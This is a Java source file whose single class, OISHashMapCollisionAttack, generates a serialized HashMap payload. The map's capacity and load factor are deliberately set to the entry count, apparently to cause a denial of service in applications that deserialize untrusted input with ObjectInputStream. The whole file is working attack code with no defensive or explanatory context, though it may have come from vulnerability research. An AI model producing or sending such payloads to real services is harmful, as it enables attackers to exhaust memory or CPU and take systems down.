package cz.topolik.oisdos;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;

/**
 * @author Tomas Polesovsky
 */
public class OISHashMapCollisionAttack {

	public static byte[] generatePayload(int entries) throws Exception {
		HashMap map = new HashMap(entries, entries);
		for (int i = 0; i < entries; i++) {
			map.put(new String(Character.toChars(i)), null);
		}

		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		try {
			new ObjectOutputStream(baos).writeObject(map);
		}
		catch (Throwable e) {
			// expected, there are not so many items inside
		}

		return baos.toByteArray();
	}

}
